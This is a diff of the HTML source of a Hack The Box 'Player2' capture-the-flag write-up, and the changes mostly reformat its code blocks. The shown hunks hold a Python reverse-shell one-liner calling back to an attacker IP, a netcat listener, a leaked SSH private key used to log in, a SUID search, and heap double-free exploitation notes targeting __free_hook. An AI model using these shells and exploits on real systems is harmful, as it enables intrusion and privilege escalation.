+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x Protobs.bin 	&lt;span class=&quot;c&quot;&gt;# making it executable&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./Protobs.bin		&lt;span class=&quot;c&quot;&gt;# file doesn't run&lt;/span&gt;
 bash: ./Protobs.original: cannot execute binary file: Exec format error
-kali@kali:~/HTB/boxes/player2/binary&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file Protobs.bin		&lt;span class=&quot;c&quot;&gt;# Analysing&lt;/span&gt;
-Protobs.bin: data						&lt;span class=&quot;c&quot;&gt;# Can't make much of it&lt;/span&gt;
-kali@kali:~/HTB/boxes/player2/binary&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;binwalk Protobs.bin	&lt;span class=&quot;c&quot;&gt;# See if sth useful is in there&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file Protobs.bin	&lt;span class=&quot;c&quot;&gt;# Analysing&lt;/span&gt;
+Protobs.bin: data	&lt;span class=&quot;c&quot;&gt;# Can't make much of it&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;binwalk Protobs.bin	&lt;span class=&quot;c&quot;&gt;# See if sth useful is in there&lt;/span&gt;
 
 DECIMAL       HEXADECIMAL     DESCRIPTION
 &lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------------------------------&lt;/span&gt;
 64            0x40            ELF, 64-bit LSB executable, AMD x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 
-kali@kali:~/HTB/boxes/player2/binary&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dd &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Protobs.bin &lt;span class=&quot;nv&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Protobs.removed &lt;span class=&quot;nv&quot;&gt;skip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;64 &lt;span class=&quot;nv&quot;&gt;bs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dd &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Protobs.bin &lt;span class=&quot;nv&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Protobs.removed &lt;span class=&quot;nv&quot;&gt;skip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;64 &lt;span class=&quot;nv&quot;&gt;bs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
 17200+0 records &lt;span class=&quot;k&quot;&gt;in
 &lt;/span&gt;17200+0 records out
 17200 bytes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;17 kB, 17 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; copied, 0.0462733 s, 372 kB/s	&lt;span class=&quot;c&quot;&gt;# Removing the first 64 bytes&lt;/span&gt;
-kali@kali:~/HTB/boxes/player2/binary&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file Protobs.removed 
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file Protobs.removed 
 Protobs.removed: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;82adae308a0023a272e626bbe83d97b2b9c630f6, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 3.2.0, not stripped
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -617,7 +756,7 @@ To do this we need to load the original binary into &lt;code class=&quot;languag
 &lt;/figure&gt;
 
 &lt;p class=&quot;text-justify&quot;&gt;Setting up the listener and uploading the edited file results in the desired four ping packages thus we have code execution:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; tun0
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; tun0
 08:18:49.392816 IP p2 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 10.10.14.7: ICMP &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;request, &lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;34815, &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;1, length 64
 08:18:49.392859 IP 10.10.14.7 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; p2: ICMP &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;reply, &lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;34815, &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;1, length 64
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;snip]
@@ -631,25 +770,25 @@ To do this we need to load the original binary into &lt;code class=&quot;languag
 &lt;/ul&gt;
 
 &lt;p class=&quot;text-justify&quot;&gt;I opted to go for the reverse shell code and after trying a few different options the python reverse shell code worked (yea it’s long and ugly but working is working):&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.7&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&lt;/span&gt;
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.7&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p class=&quot;text-justify&quot;&gt;and boom - we’ve got a shell on the box - but still no user flag :/ But we notice a MQTT service running on port 1883:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~/HTB/boxes/player2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 1234
-listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1234 ...
-connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.7] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.170] 33464
-www-data@player2:/var/www/product/protobs&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/observer/user.txt
-&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;: /home/observer/user.txt: Permission denied
-www-data@player2:/var/www/product/protobs&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ss &lt;span class=&quot;nt&quot;&gt;-tulpn&lt;/span&gt;
-Netid  State    Recv-Q   Send-Q      Local Address:Port     Peer Address:Port   
-udp    UNCONN   0        0           127.0.0.53%lo:53            0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;      
-tcp    LISTEN   0        80              127.0.0.1:3306          0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;      
-tcp    LISTEN   0        128         127.0.0.53%lo:53            0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;      
-tcp    LISTEN   0        128               0.0.0.0:22            0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;      
-tcp    LISTEN   0        100             127.0.0.1:1883          0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;      
-tcp    LISTEN   0        128               0.0.0.0:8545          0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;      
-tcp    LISTEN   0        128                     &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:80                  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;      
-tcp    LISTEN   0        128                  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;::]:22               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;::]:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;  
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 1234
+&lt;span class=&quot;go&quot;&gt;listening on [any] 1234 ...
+connect to [10.10.14.7] from (UNKNOWN) [10.10.10.170] 33464
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;www-data@player2:/var/www/product/protobs$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/observer/user.txt
+&lt;span class=&quot;go&quot;&gt;cat: /home/observer/user.txt: Permission denied
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;www-data@player2:/var/www/product/protobs$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;ss &lt;span class=&quot;nt&quot;&gt;-tulpn&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;Netid  State    Recv-Q   Send-Q      Local Address:Port     Peer Address:Port   
+udp    UNCONN   0        0           127.0.0.53%lo:53            0.0.0.0:*      
+tcp    LISTEN   0        80              127.0.0.1:3306          0.0.0.0:*      
+tcp    LISTEN   0        128         127.0.0.53%lo:53            0.0.0.0:*      
+tcp    LISTEN   0        128               0.0.0.0:22            0.0.0.0:*      
+tcp    LISTEN   0        100             127.0.0.1:1883          0.0.0.0:*      
+tcp    LISTEN   0        128               0.0.0.0:8545          0.0.0.0:*      
+tcp    LISTEN   0        128                     *:80                  *:*      
+tcp    LISTEN   0        128                  [::]:22               [::]:*  
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p class=&quot;text-justify&quot;&gt;We can subscribe to all topics using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mosquitto_sub -t '$SYS/#'&lt;/code&gt; and are disappointed because we don’t get any useful info. However keeping it running for some time we notice that every once in a while a SSH private key is broadcasted:&lt;/p&gt;
 &lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Retrieving the key from aws instance
 Key retrieved..
@@ -661,67 +800,67 @@ iZHQGq04r9PMTAFTmaQfMzDy1Hfo8kZ/2y5+2+lC7wIlFMyYze8n8g&lt;span class=&quot;o&quo
 &lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; RSA PRIVATE KEY-----
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p class=&quot;text-justify&quot;&gt;And for the first time we are lucky as the key is not password protected and we can connect right away to own user:&lt;/p&gt;
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~/HTB/boxes/player2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa observer@10.10.10.170
-Welcome to Ubuntu 18.04.2 LTS &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux 5.2.5-050205-generic x86_64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;snip]
-observer@player2:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt 
-CDE09&lt;span class=&quot;k&quot;&gt;**********************&lt;/span&gt;41251
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa observer@10.10.10.170
+&lt;span class=&quot;go&quot;&gt;Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.2.5-050205-generic x86_64)
+[snip]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;observer@player2:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt 
+&lt;span class=&quot;go&quot;&gt;CDE09**********************41251
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h1 id=&quot;root-part-intended-way&quot;&gt;Root Part (intended way)&lt;/h1&gt;
 &lt;hr /&gt;
 &lt;p&gt;Searching for SUID files shows an interesting file called Protobs:&lt;/p&gt;
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;observer@player2:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; /4000 2&amp;gt;/dev/null
-/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;observer@player2:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; /4000 2&amp;gt;/dev/null
+&lt;span class=&quot;go&quot;&gt;/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
 /usr/lib/snapd/snap-confine
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;snip]
+[snip]
 /usr/bin/pkexec
 /usr/bin/at
 /opt/Configuration_Utility/Protobs
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;snip]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+[snip]
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Looking into this directory we see that we get the helper library and libc used by Protobs:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;observer@player2:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; /opt/Configuration_Utility/
-ld-2.29.so  libc.so.6  Protobs
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;observer@player2:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; /opt/Configuration_Utility/
+&lt;span class=&quot;go&quot;&gt;ld-2.29.so  libc.so.6  Protobs
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Running the file shows the typical menu style for binary exploitation type of problems:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;observer@player2:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/opt/Configuration_Utility/Protobs 
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Protobs: Service booting up.
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Protobs: Fetching configs...
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;observer@player2:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;/opt/Configuration_Utility/Protobs 
+&lt;span class=&quot;go&quot;&gt;
+[*] Protobs: Service booting up.
+[*] Protobs: Fetching configs...
   ___         _       _       
- | _ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; _ ___| |_ ___| |__ ___
- |  _/ &lt;span class=&quot;s1&quot;&gt;'_/ _ \  _/ _ \ '&lt;/span&gt;_ &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_-&amp;lt;
- |_| |_| &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__/&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__/_.__/__/
+ | _ \_ _ ___| |_ ___| |__ ___
+ |  _/ '_/ _ \  _/ _ \ '_ (_-&amp;lt;
+ |_| |_| \___/\__\___/_.__/__/
                               v1.0 Beta
 
-protobs@player2:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;0
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;protobs@player2:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;0
+&lt;span class=&quot;go&quot;&gt;
+==Options=========
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt; 1 -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;List Available Configurations
+&lt;span class=&quot;gp&quot;&gt; 2 -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Create New Configuration
+&lt;span class=&quot;gp&quot;&gt; 3 -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Read a Configuration
+&lt;span class=&quot;gp&quot;&gt; 4 -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Delete a Configuration
+&lt;span class=&quot;gp&quot;&gt; 5 -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Exit Service
+&lt;span class=&quot;go&quot;&gt;==================
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=========&lt;/span&gt;
- 1 -&amp;gt; List Available Configurations
- 2 -&amp;gt; Create New Configuration
- 3 -&amp;gt; Read a Configuration
- 4 -&amp;gt; Delete a Configuration
- 5 -&amp;gt; Exit Service
-&lt;span class=&quot;o&quot;&gt;==================&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;file Protobs 
+&lt;span class=&quot;go&quot;&gt;Protobs: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/Configuration_Utility/ld-2.29.so, for GNU/Linux 3.2.0, BuildID[sha1]=53892814b4e50f2f75dd5fa98b077741917688a2, stripped
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~/HTB/boxes/player2/binary_2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file Protobs 
-Protobs: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /opt/Configuration_Utility/ld-2.29.so, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 3.2.0, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;53892814b4e50f2f75dd5fa98b077741917688a2, stripped
-
-kali@kali:~/HTB/boxes/player2/binary_2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;checksec Protobs
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/home/kali/HTB/boxes/player2/binary_2/Protobs'&lt;/span&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;checksec Protobs
+&lt;span class=&quot;go&quot;&gt;[\*] '/home/kali/HTB/boxes/player2/binary_2/Protobs'
     Arch:     amd64-64-little
     RELRO:    Full RELRO
     Stack:    Canary found
     NX:       NX enabled
-    PIE:      No PIE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x3fe000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-    RUNPATH:  b&lt;span class=&quot;s1&quot;&gt;'/opt/Configuration_Utility'&lt;/span&gt;
+    PIE:      No PIE (0x3fe000)
+    RUNPATH:  b'/opt/Configuration_Utility'
 
-observer@player2:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /proc/sys/kernel/randomize_va_space &lt;span class=&quot;c&quot;&gt;# check if ASLR is enabled&lt;/span&gt;
-2
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;observer@player2:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /proc/sys/kernel/randomize_va_space &lt;span class=&quot;c&quot;&gt;# check if ASLR is enabled&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;playing-the-game-protobs-part-2&quot;&gt;Playing the game, Protobs part 2&lt;/h2&gt;
 &lt;p class=&quot;text-justify&quot;&gt;In the following the exploitation of the binary via a double free will be presented. It is also possible to exploit the binary by coalesing two chunks, which is shown here &lt;a href=&quot;#Appendix&quot;&gt;[Appendix]&lt;/a&gt;.&lt;/p&gt;
@@ -763,9 +902,9 @@ Each tcache can hold 7 same-size chunks when freed before it puts other freed ch
 &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x52fd0&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p class=&quot;text-justify&quot;&gt;From this base address we can also calculate the address of &lt;em&gt;free_hook&lt;/em&gt; and &lt;em&gt;system&lt;/em&gt; as their place will also be at a fixed place measured from the base address. Using &lt;em&gt;objdump -T&lt;/em&gt; on the libc we downloaded from the server via &lt;em&gt;scp&lt;/em&gt; will get us there:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~/HTB/boxes/player2/binary_2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; libc.so.6 | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;free_hook
-00000000001e75a8  w   DO .bss   0000000000000008  GLIBC_2.2.5 __free_hook
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; libc.so.6 | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;free_hook
+&lt;span class=&quot;go&quot;&gt;00000000001e75a8  w   DO .bss   0000000000000008  GLIBC_2.2.5 __free_hook
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Analog procedure for &lt;em&gt;system&lt;/em&gt;.&lt;/p&gt;
 &lt;h3 id=&quot;null-byte-overwrite-vulnerability&quot;&gt;Null byte overwrite vulnerability&lt;/h3&gt;
 &lt;p class=&quot;text-justify&quot;&gt;Looking at the binary in &lt;em&gt;Ghidra&lt;/em&gt; we notice in the function that creates a new config that once the game description is longer or equal to the chosen description size &lt;em&gt;n&lt;/em&gt; it is terminated by a null byte at the &lt;em&gt;n+1st&lt;/em&gt; position. However malloc allocates a chunk of size &lt;em&gt;n&lt;/em&gt; and then writes &lt;em&gt;n+1&lt;/em&gt; bytes.&lt;/p&gt;
@@ -1013,7 +1152,7 @@ To do this we need to allocte and free two dummies of size 0x30 (also 0x41 in me
 
 &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
